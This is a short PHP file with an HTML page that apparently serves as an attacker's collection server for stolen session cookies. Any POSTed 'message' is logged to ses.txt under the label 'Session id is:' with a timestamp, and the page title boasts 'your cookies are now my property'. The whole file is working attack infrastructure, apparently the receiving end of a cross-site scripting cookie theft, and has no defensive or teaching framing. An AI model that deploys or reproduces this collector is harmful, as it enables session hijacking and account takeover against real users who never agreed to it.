<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  // Get the message from the form submission
  $message = $_POST['message'];

  // Write to file
  $file = 'ses.txt';
  $current = file_get_contents($file);
  $timestamp = date('H:i d-m-Y');
  $current .="Session id is:\n". $message . "\n     -at: ". $timestamp ."\n";
  file_put_contents($file, $current);
}
?>

<!DOCTYPE html>
<html>
<head>
	<title>hippiti hoppiti your cookies are now my property</title>
    <style>
		body {
			margin: 0;
			padding: 0;
			background: url('ourcookies.png') no-repeat center center fixed; 
			-webkit-background-size: cover;
			-moz-background-size: cover;
			-o-background-size: cover;
			background-size: cover;
		}
	</style>
</head>
<body>
</body>
</html>
